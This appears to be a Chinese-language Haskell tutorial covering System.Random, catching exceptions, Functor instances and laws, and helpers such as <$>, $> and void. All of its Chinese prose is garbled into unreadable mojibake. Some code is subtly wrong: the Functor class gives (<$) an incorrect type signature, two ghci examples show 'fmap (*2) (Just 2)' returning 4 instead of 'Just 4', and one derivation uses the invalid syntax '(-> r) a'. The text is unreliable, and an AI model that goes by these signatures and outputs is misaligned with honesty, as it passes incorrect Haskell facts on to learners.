      ``System.Random`` Ê®°ÂùóÊèê‰æõ‰∫ÜÂá†‰∏™ÁîüÊàêÈöèÊú∫Êï∞ÁöÑÂáΩÊï∞Ôºö

      .. rubric:: ` <#random>`__ random
         :name: random

      random :: (Random a, RandomGen g) => g -> (a, g)

      ÂÖ∂‰∏≠ÂèàÊúâ‰∏§‰∏™Êñ∞ÁöÑtypeclassÔºåRandomË°®Á§∫ÂèØ‰ª•ÂèñÈöèÊú∫ÔºåRandomGenË°®Á§∫ÈöèÊú∫Êï∞ÁîüÊàêÂô®„ÄÇrandomÂáΩÊï∞Êé•Êî∂‰∏Ä‰∏™ÈöèÊú∫Êï∞ÁîüÊàêÂô®ÔºåËøîÂõû‰∏Ä‰∏™ÂÖÉÁªÑÔºåÂÖ∂‰∏≠Á¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÊòØÁîüÊàêÁöÑÈöèÊú∫Êï∞ÔºåÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†ÊòØ‰∏Ä‰∏™Êñ∞ÁöÑÈöèÊú∫Êï∞ÁîüÊàêÂô®

      Ëé∑ÂèñÈöèÊú∫Êï∞ÁîüÊàêÂô®ÂèØ‰ª•‰ΩøÁî® ``mkStdGen`` ÂáΩÊï∞Ôºö

      mkStdGen :: Int -> StdGen

      ÂÖ∂‰∏≠ ``StdGen`` ÊòØ‰∏Ä‰∏™RandomGenÁöÑÂÆû‰æã

      ËøêÁî®randomÁîüÊàêÈöèÊú∫Êï∞ÈúÄË¶ÅÊåáÂÆöÁ±ªÂûãÔºå‰∏çÁÑ∂Á®ãÂ∫èÊó†Ê≥ïÁ°ÆÂÆö ``a`` ÊòØ‰ªÄ‰πàÁ±ªÂûã„ÄÇ‰æãÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         ghci> random (mkStdGen 100) :: (Int, StdGen)
         (9216477508314497915,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})
         ghci> random (mkStdGen 100) :: (Char, StdGen)
         ('\537310',StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})
         ghci> random (mkStdGen 100) :: (Bool, StdGen)
         (True,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})

      ÂÜçÊ¨°ËøêË°åÂêåÊ†∑ÁöÑÂáΩÊï∞Ôºå‰ºöÂæóÂà∞ÂêåÊ†∑ÁöÑÁªìÊûú„ÄÇÊâÄ‰ª•Â¶ÇÊûúÈúÄË¶ÅÁîüÊàêÂÖ∂‰ªñÁöÑÈöèÊú∫Êï∞ÔºåÈúÄË¶ÅÊõ¥Êç¢ÁîüÊàêÂô®ÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî®‰∏ä‰∏ÄÊ¨°Ë∞ÉÁî®ÁªìÊûúËøîÂõûÁöÑÊñ∞ÈöèÊú∫Êï∞ÁîüÊàêÂô®Ôºö

      .. container:: float highlight haskell
      ::

         threeCoins :: StdGen -> (Bool, Bool, Bool)  
         threeCoins gen =   
             let (firstCoin, newGen) = random gen  
                 (secondCoin, newGen') = random newGen  
                 (thirdCoin, newGen'') = random newGen'  
             in  (firstCoin, secondCoin, thirdCoin) 

      .. rubric:: ` <#randoms>`__ randoms
         :name: randoms

      randoms :: (Random a, RandomGen g) => g -> [a]

      randomsÊé•Êî∂‰∏Ä‰∏™RandomGenÔºåËøîÂõû‰∏Ä‰∏™ÈöèÊú∫ÁöÑÊó†Á©∑ÂàóË°®„ÄÇÂõ†‰∏∫ÂÆÉÊòØÊó†Á©∑ÁöÑÔºåÊâÄ‰ª•‰∏ç‰ºöËøîÂõûÊñ∞ÁöÑÈöèÊú∫Êï∞ÁîüÊàêÂô®

      .. rubric:: ` <#randomR>`__ randomR
         :name: randomR

      randomR :: (Random a, RandomGen g) => (a, a) -> g ->
      (a, g)

      ÂèØ‰ª•Áî®Êù•ÁîüÊàêÊúâËåÉÂõ¥ÁöÑÈöèÊú∫Êï∞ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ‰∏Ä‰∏™ÂÖÉÁªÑÔºåË°®Á§∫ÁîüÊàêÈöèÊú∫Êï∞ÁöÑËåÉÂõ¥(Èó≠Âå∫Èó¥)

      .. rubric:: ` <#randomRs>`__ randomRs
         :name: randomRs

      randomRs :: (Random a, RandomGen g) => (a, a) -> g ->
      [a]

      Âêå‰∏ä‰∏§‰∏™ÔºåÁîüÊàêÊúâËåÉÂõ¥ÁöÑÊó†Á©∑ÈöèÊú∫Êï∞ÂàóË°®

      .. rubric:: ` <#getStdGen>`__ getStdGen
         :name: getStdGen

      Â¶ÇÊûúÊÉ≥Ë¶ÅËÆ©Á®ãÂ∫èÊØèÊ¨°ËøêË°åÂæóÂà∞‰∏çÂêåÁöÑÈöèÊú∫ÁªìÊûúÔºåÈúÄË¶Å‰ΩøÁî® ``getStdGen`` Êù•Ëé∑ÂèñÂÖ®Â±ÄÈöèÊú∫Êï∞ÁîüÊàêÂô®ÔºåÂÆÉ‰ºöÂú®ÊØèÊ¨°ËøêË°åÁöÑÊó∂ÂÄô‰∫ßÁîü‰∏çÂêåÁöÑÂÄºÔºå‰πüÂõ†Ê≠§ÔºåÂÆÉËøîÂõûÁöÑÊòØ‰∏Ä‰∏™I/O
      actionÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™Áõ¥Êé•ÁöÑStdGen

      getStdGen :: Control.Monad.IO.Class.MonadIO m => m
      StdGen

      Âç≥ÂèØ‰ª•ÁúãÊàêgetStdGen :: IO
      StdGenÔºåÈúÄË¶Å‰ΩøÁî®<-Êìç‰ΩúÁ¨¶Â∞ÜStdGenÊèêÂèñÂá∫Êù•

      ‰ΩÜÊòØÂú®Âêå‰∏Ä‰∏™Á®ãÂ∫è‰∏≠ÔºågetStdGenÁöÑÁªìÊûúÊòØÁõ∏ÂêåÁöÑÔºåÂÖ®Â±ÄÈöèÊú∫Êï∞ÁîüÊàêÂô®‰∏ç‰ºöËá™Âä®Êõ¥Êñ∞ÔºåÊâÄ‰ª•Â∞±ÈúÄË¶ÅÂè¶‰∏Ä‰∏™ÂáΩÊï∞newStdGen

      .. rubric:: ` <#newStdGen>`__ newStdGen
         :name: newStdGen

      newStdGen :: Control.Monad.IO.Class.MonadIO m => m
      StdGen

      ÊâßË°ånewStdGen‰ºöËøõË°å‰∏§‰∏™Êìç‰ΩúÔºö

      -  Êõ¥Êñ∞ÂÖ®Â±ÄÈöèÊú∫Êï∞ÁîüÊàêÂô®Ôºå‰∏ãÊ¨°ÊâßË°ågetStdGen‰ºöËé∑Âæó‰∏çÂêåÁöÑÁªìÊûú
      -  ËøîÂõû‰∏Ä‰∏™I/O
         actionÔºåÂåÖÂê´‰∏Ä‰∏™Êñ∞ÁöÑStdGenÔºà‰ΩÜÊòØËøô‰∏™ÁîüÊàêÂô®ÂíåÂÖ®Â±ÄÁîüÊàêÂô®‰πü‰∏çÂêåÔºâ

      .. rubric:: ` <#Exceptions>`__ Exceptions
         :name: Exceptions

      Á®ãÂ∫èÂú®ËøêË°åÂ§±Ë¥•Êó∂‰ºöÊäõÂá∫ÂºÇÂ∏∏ÔºåÂèØ‰ª•ÈÄöËøá ``Control.Exception`` Ê®°Âùó‰∏≠ÁöÑ ``catch`` ÂáΩÊï∞Êù•ÊçïËé∑ÂºÇÂ∏∏Ôºö

      catch :: Exception e => IO a -> (e -> IO a) -> IO a

      Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØË¶ÅËøõË°åÁöÑÊìç‰ΩúÔºå‰ª•IO
      a‰∏∫ËøîÂõûÂÄºÁöÑÁ±ªÂûãÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂÆÉÊé•Êî∂ÂºÇÂ∏∏Âπ∂ËøõË°åÊìç‰ΩúÔºå‰æãÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         import Control.Exception

         main = main' `catch` handler

         main' :: IO ()
         main' = do
             ...

         handler :: Exception e => e -> IO ()
         handler e =  putStrLn "..."

      ‰πüÂèØ‰ª•Âà©Áî®ÂÆàÂç´ÔºàguardÔºâËØ≠Ê≥ïÂíå ``System.IO.Error`` ‰∏≠ÁöÑÂáΩÊï∞Êù•Âà§Êñ≠IOÂºÇÂ∏∏ÁöÑÁ±ªÂûãÊù•ËøõË°å‰∏çÂêåÊìç‰ΩúÔºö

      .. container:: float highlight haskell
      ::

         import System.Environment
         import System.IO.Error
         import Control.Exception
           
         main = toTry `catch` handler
                       
         toTry :: IO ()  
         toTry = do (fileName:_) <- getArgs  
                    contents <- readFile fileName  
                    putStrLn $ "The file has " ++ show (length (lines contents)) ++ " lines!"  
           
         handler :: IOError -> IO ()  
         handler e  
             | isDoesNotExistError e = putStrLn "The file doesn't exist!"  
             | otherwise = ioError e  

      ÂÖ∑‰ΩìÁõ∏ÂÖ≥ÂÖ®ÈÉ®ÂáΩÊï∞ËßÅÊñáÊ°£Ôºö `System.IO.Error <https://hackage.haskell.org/package/base-4.15.0.0/docs/System-IO-Error.html>`__ „ÄÅ `Control.Exception <https://hackage.haskell.org/package/base-4.15.0.0/docs/Control-Exception-Base.html>`__


   .. rubric:: ` <#Functors>`__ Functors
      :name: Functors

      ÂáΩÂ≠êÔºàFunctorÔºâÊòØ‰∏Ä‰∏™Á±ªÂûãÁ±ªÔºàtypeclassÔºâÔºåÂíåÂÖ∂‰ªñÁ±ªÂûãÁ±ª‰∏ÄÊ†∑ÔºåÂÆÉËßÑÂÆö‰∫ÜÂÖ∂ÂÆû‰æãÁ±ªÂøÖÈ°ªÂÆûÁé∞ÁöÑÂäüËÉΩÔºà‰æãÂ¶ÇEqÁ±ªÂûãÁ±ªËßÑÂÆö‰∫ÜÂÆÉÁöÑÂÆû‰æãÂøÖÈ°ªÊòØÂèØ‰ª•ÊØîËæÉÊòØÂê¶Áõ∏Á≠âÁöÑÔºâÔºåFunctorËßÑÂÆöÁ±ªÂÆÉÁöÑÂÆû‰æãÂøÖÈ°ªÊòØÂèØ‰ª•ËøõË°åÊò†Â∞ÑÁöÑ„ÄÇFunctorË¶ÅÊ±Ç‰ΩøÁî® ``fmap``
      :: (a -> b) -> f a -> f b
      ÂáΩÊï∞Êù•ÂÆûÁé∞Ëøô‰∏™ÂäüËÉΩÔºåÂÆÉÊé•Êî∂‰∏Ä‰∏™a ->
      bÁ±ªÂûãÁöÑÂáΩÊï∞„ÄÅ‰∏Ä‰∏™ÂÜÖÈÉ®ÂÖÉÁ¥†‰∏∫aÁ±ªÂûãÁöÑÂáΩÂ≠êÔºåËøîÂõû‰∏Ä‰∏™ÂÜÖÈÉ®ÂÖÉÁ¥†‰∏∫bÁ±ªÂûãÁöÑÂáΩÂ≠ê

      FunctorÂèØ‰ª•ÊØî‰ΩúÁõíÂ≠êÔºåÈÇ£fmapÂáΩÊï∞Â∞±Áõ∏ÂΩì‰∫éÁªôÂÆö‰∏Ä‰∏™ÂáΩÊï∞Âíå‰∏Ä‰∏™ÁõíÂ≠êÔºåÂ∞ÜÁõíÂ≠ê‰∏≠ÁöÑÂÖ®ÈÉ®ÂÖÉÁ¥†ÈÉΩÂ∫îÁî®Ëøô‰∏™ÂáΩÊï∞ÔºåÂÜçËøîÂõûÂ∫îÁî®ÂáΩÊï∞ÂêéÁöÑÁõíÂ≠ê

      ÂáΩÂ≠êÁöÑÂÆû‰æãÂøÖÈ°ªÊòØ‰∏Ä‰∏™Kind‰∏∫\* ->
      \*ÁöÑÁ±ªÂûãÊûÑÈÄ†Âô®ÔºåÂõ†‰∏∫ÂÆÉË¶ÅÊ±ÇÂÖ∂ÊòØ‰∏Ä‰∏™ÁõíÂ≠êÔºåÁõíÂ≠êÂú®Êé•Êî∂ÂÜÖÂÆπÂêéÊâç‰ºöÊàê‰∏∫‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑÁ±ªÂûã„ÄÇfmap‰∏≠ÁöÑ ``f a`` Âíå ``f b`` ‰πüÊòØÂõ†‰∏∫ ``f`` ÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®ÔºåÂú®Êé•Êî∂Á±ªÂûãa/bÂêéÊâç‰ºöÂèòÊàê‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûãÔºàf
      aÂíåf bÔºâÂá∫Áé∞Âú®ÂáΩÊï∞Á±ªÂûãÂ£∞Êòé‰∏≠

      FunctorÁöÑÂÆö‰πâÊòØ:

      .. container:: float highlight haskell
      ::

         class Functor f where
             fmap :: (a -> b) -> f a -> f b
             (<$) :: a -> f a -> f b
             (<$) = fmap . const

      ÂèØ‰ª•ÂèëÁé∞Functor‰∏ç‰ªÖÈúÄË¶ÅfmapÂáΩÊï∞ÔºåËøòÈúÄË¶Å‰∏Ä‰∏™<$ÂáΩÊï∞ÔºåÂÆÉÊé•Êî∂‰∏Ä‰∏™aÁ±ªÂûãÁöÑÂèòÈáèÂíå‰∏Ä‰∏™ÂÜÖÂÆπ‰∏∫bÁ±ªÂûãÁöÑÂáΩÂ≠êÔºåËøîÂõû‰∏Ä‰∏™ÂÜÖÂÆπ‰∏∫aÁ±ªÂûãÁöÑÂáΩÂ≠êÔºõ‰ΩúÁî®Â∞±ÊòØÂ∞Ü‰º†ÂÖ•ÁöÑÂáΩÂ≠ê‰∏≠ÁöÑÊâÄÊúâÂÖÉÁ¥†ÈÉΩÊõøÊç¢‰∏∫‰º†ÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºåÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         ghci> 'a' <$ [1, 2, 3]
         "aaa"

      ‰ΩÜÂÆÉ‰∏çÊòØÂ£∞Êòé‰∏Ä‰∏™ÂáΩÂ≠êÂÆû‰æãÂøÖÈ°ªÁöÑÔºåÂõ†‰∏∫ÂÆÉÂèØ‰ª•‰ΩøÁî®fmapÂíåconstÂáΩÊï∞Â§çÂêàÊù•ÂÆûÁé∞ÔºåÂÖ∂‰∏≠constÁöÑÁ±ªÂûãÁ≠æÂêçÔºö

      const :: a -> b -> a

      Âç≥Êé•Êî∂‰∏§‰∏™ÂèÇÊï∞Ôºå‰ΩÜÂßãÁªàÂè™ËøîÂõûÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞

      .. rubric:: ` <#FunctorÂÆû‰æã>`__ FunctorÂÆû‰æã
         :name: FunctorÂÆû‰æã

      .. rubric:: ` <#>`__ []
         :name: section

      ÂàóË°®[]ÊòØ‰∏Ä‰∏™ÂáΩÂ≠êÔºåÂÆÉÈÄöËøámapÂáΩÊï∞Êù•ÂÆûÁé∞fmapÁöÑÂäüËÉΩÔºö

      .. container:: float highlight haskell
      ::

         instance Functor [] where
             fmap = map

      map :: (a -> b) -> [a] -> [b]

      mapÂíåfmapË¶ÅÊ±ÇÁöÑÁõ∏ÂêåÔºåËææÊàêÁöÑÁõÆÁöÑ‰πü‰∏ÄËá¥„ÄÇmapÊé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞Âíå‰∏Ä‰∏™ÂàóË°®ÔºåÂÆÉ‰ºöÂ∞ÜÂàóË°®‰∏≠ÁöÑÊâÄÊúâÂÖÉÁ¥†ÈÉΩÂ∫îÁî®Ëøô‰∏™ÂáΩÊï∞ÂêéÂÜçËøîÂõûËøô‰∏™ÂàóË°®

      .. rubric:: ` <#Maybe>`__ Maybe
         :name: Maybe

      Maybe‰πüÂÖ∑Êúâkind \* -> \*ÔºåÂÆÉ‰πüÊòØ‰∏Ä‰∏™ÂáΩÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         instance Functor Maybe where
             fmap f Nothing = Nothing
             fmap f (Just x) = Just (f x)

         ghci> fmap (*2) Nothing
         Nothing
         ghci> fmap (*2) (Just 2)
         Just 4

      .. rubric:: ` <#Either-a>`__ Either a
         :name: Either-a

      EitherÁöÑkindÊòØ\* -> \* ->
      \*ÔºåÊòæÁÑ∂ÂÆÉ‰∏çÊòØÂáΩÂ≠êÔºå‰ΩÜÊòØÂõ∫ÂÆö‰∫Ü‰∏Ä‰∏™‰º†ÂÖ•Á±ªÂûãÁöÑEither
      aÁöÑkindÊòØ\* -> \*Ôºå‰πüÊòØ‰∏Ä‰∏™ÂáΩÂ≠êÔºö

      .. container:: float highlight haskell
      ::

         instance Functor (Either a) where
             fmap f (Left x) = Left x
             fmap f (Right x) = Right (f x)

         ghci> fmap (*2) (Left 4)
         Left 4
         ghci> fmap (*2) (Right 4)
         Right 8

      Âõ†‰∏∫‰ΩøÁî®EitherÊó∂‰∏ÄËà¨Áî®Âè≥ÂÄºË°®Á§∫Ê≠£Â∏∏ÁªìÊûúÔºåÂ∑¶ÂÄºË°®Á§∫ÂºÇÂ∏∏‰ø°ÊÅØÔºåÊâÄ‰ª•‰ΩøÁî®fmapÊó∂Âè™ÂØπÂè≥ÂÄºËøõË°åÊìç‰ΩúÔºåÂ¶ÇÊûúÊó∂Â∑¶ÂÄºÂàô‰øùÊåÅ‰∏çÂèòÔºàËÄå‰∏îÂ∑¶ÂÄºÊ≠§Êó∂‰πü‰Ωú‰∏∫Á°ÆÂÆöÁ±ªÂûãÁ°ÆÂÆöÂÄºÂ≠òÂú®Ôºâ

      .. rubric:: ` <#IO>`__ IO
         :name: IO

      IO‰πüÊòØ‰∏Ä‰∏™ÂáΩÂ≠êÔºå‰ΩøÁî®fmapÂØπIO‰∏≠ÂÜÖÂÆπÂ∫îÁî®ÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         instance Functor IO where
             fmap f action = do
                 result <- action
                 return (f result)

         ghci> fmap ("input: "++) getLine
         test
         "input: test"

      .. rubric:: ` <#a>`__ (,) a
         :name: a

      (,)Ë°®Á§∫‰∏Ä‰∏™‰∫åÂÖÉÁªÑÁöÑÁ±ªÂûãÊûÑÈÄ†Âô®Ôºå(,) :: \* -> \* ->
      \*ÔºåËÄåÁ°ÆÂÆö‰∫ÜÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑÁ±ªÂûãÂêéÂ∞±ÂèòÊàê‰∫Ü(,)
      aÔºåÂÆÉÁöÑkindÊòØ\* ->
      \*„ÄÇ‰πüÊòØ‰∏Ä‰∏™ÂáΩÂ≠êÔºåËøõË°åfmapÂáΩÊï∞Êó∂Âè™ÂØπÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†Â∫îÁî®Ôºö

      .. container:: float highlight haskell
      ::

         instance Functor ((,) a) where
             fmap f (x, y) = (x, f y)

      Âè™Ââ©‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑ‰∏âÂÖÉÁªÑÂíåÂõõÂÖÉÁªÑ‰πüÈÉΩÊòØÂáΩÂ≠êÔºåfmap‰πüÂè™ÂØπÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†Â∫îÁî®Ôºö

      .. container:: float highlight haskell
      ::

         instance Functor ((,,) a b) where
             fmap f (a, b, c) = (a, b, f c)

         instance Functor ((,,,) a b c) where
             fmap f (a, b, c, d) = (a, b, c, f d)

      .. rubric:: ` <#gt-r>`__ (->) r
         :name: gt-r

      ->‰πüÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®ÔºåÂÆÉÁöÑkindÔºö

      (->) :: \* -> \* -> \*

      ‰∏Ä‰∏™Êò†Â∞ÑÔºà‰∏ÄÂÖÉÂáΩÊï∞ÔºâÁöÑÁ±ªÂûãa -> b‰πüÂèØ‰ª•ÂÜôÊàê(->) a
      bÔºåÂÆÉÊòØÁî±Á±ªÂûãaÂíåÁ±ªÂûãbËæìÂÖ•Âà∞Á±ªÂûãÊûÑÈÄ†Âô®->‰∏≠ÂêéÂΩ¢ÊàêÁöÑ‰∏Ä‰∏™ÂÖ∑‰ΩìÁ±ªÂûã„ÄÇÊâÄ‰ª•Á°ÆÂÆö‰∫ÜËæìÂÖ•Á±ªÂûãÂêéÁöÑ‰∏ÄÂÖÉÂáΩÊï∞ÁöÑÁ±ªÂûãÂ∞±ÊòØ(->)
      rÔºàÂÖ∂‰∏≠ ``r`` ÊòØËæìÂÖ•ÁöÑÁ±ªÂûãÔºâ

      ËßÑÂÆöÁöÑfmapÁöÑÁ±ªÂûãÁ≠æÂêçÊòØÔºö

      fmap :: (a -> b) -> f a -> f b

      ÂÖ∂‰∏≠ÁöÑfÊòØÂáΩÂ≠êÔºåËÄåÂú®Ëøô‰∏™ÂÆû‰æã‰∏≠(->)
      rÂ∞±ÊòØÂáΩÂ≠êÔºåÂ∞ÜÂÖ∂Â∏¶ÂÖ•fÂèØ‰ª•ÂæóÂà∞Ôºö

      fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b)

      ÊääÂÖ∂‰∏≠ÁöÑ(->)Êç¢Êàê‰∏≠ÁºÄÂèØ‰ª•ÂæóÂà∞Ôºö

      fmap :: (a -> b) -> (r -> a) -> (r -> b)

      | ‰º†ÂÖ•‰∏§‰∏™ÂáΩÊï∞Ôºå‰∏Ä‰∏™Á±ªÂûã‰∏∫a -> bÔºå‰∏Ä‰∏™Á±ªÂûã‰∏∫r ->
        aÔºåËøîÂõû‰∏Ä‰∏™ÂáΩÊï∞ÔºåÁ±ªÂûã‰∏∫r -> b„ÄÇ
      | ‰∏çÈöæÊé®ÊµãËøô‰∏™fmapÊòØÂ∞ÜËøô‰∏§‰∏™ÂáΩÊï∞Â§çÂêà‰∫ÜÔºåÂÖàÂØπËæìÂÖ•ÂØπrÂ∫îÁî®Á¨¨‰∫å‰∏™ÂáΩÊï∞‰∫ßÁîüÁ±ªÂûãaÁöÑÁªìÊûúÔºåÁÑ∂ÂêéÂú®Â∫îÁî®Á¨¨‰∏Ä‰∏™ÂáΩÊï∞‰∫ßÁîüÁ±ªÂûãbÁöÑÁªìÊûúÔºåÊâÄ‰ª•(->)
        rÂÆö‰πâÁöÑfmapÊòØÔºö

      .. container:: float highlight haskell
      ::

         instance Functor ((->) r) where
             fmap f g = (\x -> f (g x))

      ÊâÄ‰ª•(->) rÁöÑfmapÂÖ∂ÂÆûÂ∞±ÊòØÂáΩÊï∞Â§çÂêà(.)Ôºö

      .. container:: float highlight haskell
      ::

         instance Functor ((->) r) where
             fmap = (.)

      .. container:: float highlight haskell
      ::

         ghci> :t fmap (*3) (+100)  
         fmap (*3) (+100) :: (Num a) => a -> a  
         ghci> fmap (*3) (+100) 1  
         303  
         ghci> (*3) `fmap` (+100) $ 1  
         303  
         ghci> (*3) . (+100) $ 1  
         303

      .. rubric:: ` <#Functor-Laws>`__ Functor Laws
         :name: Functor-Laws

      ÊâÄÊúâÁöÑÂáΩÂ≠êÈÉΩÂ∫îËØ•Êª°Ë∂≥‰∏§‰∏™ÂÆöÂæã„ÄÇËøô‰∏§‰∏™ÂÆöÂæã‰∏çÊòØHaskellÂº∫Âà∂Ë¶ÅÊ±ÇÁöÑÔºå‰ΩÜÂ∫îËØ•Á°Æ‰øù‰∏Ä‰∏™ÂáΩÂ≠êÊª°Ë∂≥Ëøô‰∏§‰∏™ÂÆöÂæãÔºö

      #. ``fmap id = id`` ÔºàÂÖ∂‰∏≠id‰∏∫ÂáΩÊï∞ ``(\x -> x)`` ÔºâÔºöÂç≥ÂØπ‰∏Ä‰∏™ÂáΩÂ≠êfmap
         idÔºåÈÇ£ÂÆÉÂ∫îËØ•ËøîÂõûÊú¨Ë∫´Ôºàfmap id a = id a =
         aÔºåa‰∏∫‰∏Ä‰∏™ÂáΩÂ≠êÔºâÔºåÊØîÂ¶ÇÔºö

         .. container:: float highlight haskell
         ::

            ghci> fmap id [1, 2, 3]
            [1,2,3]
            ghci> fmap id (Just 2)
            Just 2

      #. ``fmap (f . g) = fmap f . fmap g`` ÔºöÂç≥ÂáΩÂ≠êÁöÑfmapÊîØÊåÅÁªìÂêàÂæã
         fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap
         g a)ÔºåÂÖ∂‰∏≠ ``a`` ‰∏∫‰∏Ä‰∏™ÂáΩÂ≠ê
         fmap (f . g) (Just x) = fmap f (fmap g (Just x)) =
         fmap f (Just (g x)) = Just (f (g x))

         .. container:: float highlight haskell
         ::

            ghci> fmap ((*3) . (+100)) (Just 1)
            Just 303

      Êª°Ë∂≥Á¨¨‰∏Ä‰∏™ÂÆöÂæãÁöÑÂáΩÂ≠ê‰∏ÄÂÆöÊª°Ë∂≥Á¨¨‰∫å‰∏™ÂÆöÂæãÔºåÊâÄ‰ª•Âè™Ë¶ÅÊ£ÄÊü•ÂáΩÂ≠êÊòØÂê¶Êª°Ë∂≥Á¨¨‰∏Ä‰∏™ÂÆöÂæãÂç≥ÂèØ

      .. rubric:: ` <#Intuition>`__ Intuition
         :name: Intuition

      ÂØπ‰∫éÂáΩÂ≠êÂíåfmapÔºåÊúâ‰∏§ÁßçÁêÜËß£ÊñπÊ≥ï

      #. ÂáΩÂ≠êÊòØ‰∏ÄÁßçÂÆπÂô®ÔºàcontainerÔºâÔºõfmapÊé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞Âíå‰∏Ä‰∏™ÂÆπÂô®ÔºåÂú®ÂÆπÂô®ÂÜÖÈÉ®Â∫îÁî®Ëøô‰∏™ÂáΩÊï∞ÔºåËøîÂõûÂ∫îÁî®ÂêéÁöÑÊñ∞ÂÆπÂô®

      #. ÂáΩÂ≠êÊòØ‰∏ÄÁßçËÆ°ÁÆó‰∏ä‰∏ãÊñáÔºàcontextÔºâÔºõfmapÊòØÊüØÈáåÂåñÁöÑÔºåÊääÂÖ∂Á±ªÂûãÁ≠æÂêçÁúã‰Ωú

         fmap :: (a -> b) -> (f a -> f b)

         Êé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞ËøîÂõûÂè¶‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰º†ÂÖ•ÂáΩÊï∞g :: a ->
         bÔºåfmapÂ∞ÜÂÖ∂ËΩ¨Êç¢‰∏∫Êñ∞ÁöÑÂáΩÊï∞

         fmap g :: f a -> f b

         ‰ΩøÊôÆÈÄöÁöÑÂáΩÊï∞gÂèØ‰ª•Âú®ËÆ°ÁÆó‰∏ä‰∏ãÊñá ``f`` ‰∏≠‰ΩøÁî®ÔºåËøôÁßçËΩ¨Êç¢‰πüË¢´Áß∞‰∏∫ÊèêÂçáÔºàliftÔºâ

      .. rubric:: ` <#Â∏∏Áî®ÂáΩÊï∞>`__ Â∏∏Áî®ÂáΩÊï∞
         :name: Â∏∏Áî®ÂáΩÊï∞

      .. rubric:: ` <#lt-gt>`__ <$>
         :name: lt-gt

      ``<$>`` ÂáΩÊï∞ÊòØ ``fmap`` ÁöÑ‰∏≠ÁºÄÂΩ¢ÂºèÔºàÂÆÉÁúãÁùÄÁ±ª‰ºº ``$`` Ôºå ``f $ 3`` Â∞ÜfÂ∫îÁî®Âú®Âçï‰∏™ÂÄº3‰∏äÔºåËÄå ``f <$> [1, 2, 3]`` Â∞ÜfÂ∫îÁî®Âú®‰∏Ä‰∏™ÂáΩÂ≠ê‰∏äÔºå‰πüÂ∞±ÊòØÂ∫îÁî®Âú®‰∏Ä‰∏™ÂáΩÂ≠êÂÜÖÈÉ®ÁöÑÊâÄÊúâÂÄº‰∏äÔºâÔºö

      .. container:: float highlight haskell
      ::

         ghci> fmap (*2) (Just 2)
         4
         ghci> (*2) <$> Just 2
         4

      .. rubric:: ` <#gt>`__ $>
         :name: gt

      ``$>`` ÂáΩÊï∞ÂåÖÂê´Âú® ``Data.Functor`` Ê®°Âùó‰∏≠

      ($>) :: Functor f => f a -> b -> f b

      FunctorÂÆö‰πâÊó∂Ë¶ÅÊ±Ç‰∫Ü ``<$`` ÂáΩÊï∞ÔºåÂ∞ÜÂáΩÂ≠êÂÜÖÈÉ®ÁöÑÂÖÉÁ¥†ÂÖ®ÈÉ®ÊõøÊç¢‰∏∫ÊåáÂÆöÁöÑÊüê‰∏™ÂÄºÔºåËÄå ``$>`` Ê≠£Â•ΩÂ∞Ü ``<$`` ÂáΩÊï∞ÁöÑ‰∏§‰∏™ÂèÇÊï∞Âèç‰∫ÜËøáÊù•ÔºåÁõ∏ÂΩì‰∫é ``flip (<$)`` Ôºö

      .. container:: float highlight haskell
      ::

         ghci> 'a' <$ [1, 2, 3]
         "aaa"
         ghci> [1, 2, 3] $> 'a'
         "aaa"

      .. rubric:: ` <#void>`__ void
         :name: void

      ``void`` ÂáΩÊï∞‰πüÂåÖÂê´Âú® ``Data.Functor`` Ê®°Âùó‰∏≠

      void :: Functor f => f a -> f ()

      voidÂáΩÊï∞Êää‰∏Ä‰∏™ÂáΩÂ≠êÂÜÖÈÉ®ÁöÑÂÖ®ÈÉ®ÂÖÉÁ¥†ÈÉΩÂèòÊàêÁ©∫Ôºà ``()`` ÔºâÔºå ``void x`` Áõ∏ÂΩì‰∫é ``() <$ x`` Ôºö

      .. container:: float highlight haskell
      ::

         ghci> void [1, 2, 3]
         [(), (), ()]
         ghci> void (Just 2)
         Just ()


   .. rubric:: ` <#Applicative-Functor>`__ Applicative
      Functor
      :name: Applicative-Functor

      Â∫îÁî®ÂáΩÂ≠êÔºàApplicative
      FunctorÔºâÊòØÂáΩÂ≠êÁöÑÂçáÁ∫ßÁâàÔºåÂÆÉÂåÖÂê´Âú® ``Control.Applicative`` Ê®°Âùó‰∏≠„ÄÇ

